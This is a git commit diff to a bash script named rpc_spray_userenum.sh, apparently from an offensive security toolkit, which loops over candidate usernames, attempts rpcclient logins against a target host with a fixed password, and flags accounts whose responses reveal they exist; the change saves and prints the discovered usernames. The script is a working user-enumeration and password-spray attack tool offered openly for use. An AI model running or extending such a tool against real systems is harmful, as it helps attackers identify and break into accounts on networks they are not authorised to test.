fe86e16de3b57677d35e0dc85404a460240ec1d3
deadone <45006877+deadone@users.noreply.github.com>
2020-08-16 10:40:40 -0600

    Update rpc_spray_userenum.sh

--- bash/rpc_spray_userenum.sh
+++ bash/rpc_spray_userenum.sh
@@ -21,9 +21,16 @@ do
 	string=`rpcclient -U "$u%password" ${host} | grep -i "NT_STATUS_LOGON_FAILURE"`
 	if [[ $string == *"LOGON_FAILURE"* ]]; then
   		echo -e "\n[*] VALID USERNAME FOUND:	${u}\n"
+		echo $u >> /tmp/rpc-found.txt
 		i=$((i+1))
 	fi
 	echo -ne "\r"
 done
 echo -e "\n"
-echo -e "[*] Done. Found ${i} Valid Usernames."
+if [ -f "/tmp/rpc-found.txt" ]; then
+	echo -e "[*] Found ${i} Valid Usernames:"
+	cat /tmp/rpc-found.txt
+	rm /tmp/rpc-found.txt
+else
+	echo -e "[*] Done. No users found." 
+fi
